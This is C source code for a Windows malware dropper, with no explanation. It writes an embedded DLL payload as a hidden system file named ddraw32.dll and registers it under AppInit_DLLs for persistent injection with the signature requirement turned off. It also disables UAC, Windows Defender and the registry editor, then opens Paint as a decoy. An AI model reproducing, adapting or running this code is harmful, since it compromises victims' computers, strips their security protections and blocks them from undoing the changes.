#include <Windows.h>
#include "data.h"

void main()
{
	char system[MAX_PATH];
	DWORD wb;
	GetSystemDirectoryA(system, sizeof(system));
	LPTSTR Path = strcat(system,"\\ddraw32.dll");
	HANDLE File = CreateFileA(Path, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	WriteFile(File, ddraw, sizeof(ddraw), &wb, NULL);
	CloseHandle(File);

	HKEY key;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"), &key);

	RegSetValueEx(key, TEXT("AppInit_DLLs"), 0, REG_SZ, (BYTE*)Path, (lstrlen(Path) + 1) * sizeof(TCHAR));

	DWORD x = 1;
	RegSetValueEx(key, TEXT("LoadAppInit_DLLs"), 0, REG_DWORD, (BYTE*)&x, sizeof(x));

	DWORD x2 = 0;
	RegSetValueEx(key, TEXT("RequireSignedAppInit_DLLs"), 0, REG_DWORD, (BYTE*)&x2, sizeof(x2));

	RegCloseKey(key);

	HKEY mKey;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), &mKey);

	DWORD x4 = 0;
	RegSetValueEx(mKey, TEXT("EnableLUA"), 0, REG_DWORD, (BYTE*)&x4, sizeof(x4));

	RegCloseKey(mKey);

	HKEY dKey;
	HKEY defender;
	RegCreateKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows Defender"), &dKey);
	RegCreateKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows Defender\\Policy Manager"), &defender);

	DWORD x5 = 1;
	RegSetValueEx(dKey, TEXT("DisableAntiSpyware"), 0, REG_DWORD, (BYTE*)&x5, sizeof(x5));

	RegCloseKey(dKey);
	RegCloseKey(defender);
	
	HKEY sKey;
	RegCreateKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), &sKey);

	DWORD x3 = 1;
	RegSetValueEx(sKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, (BYTE*)&x3, sizeof(x3));

	RegCloseKey(sKey);
	ShellExecuteA(NULL, NULL, "mspaint", NULL, NULL, SW_SHOWDEFAULT);
	ExitProcess(0);
}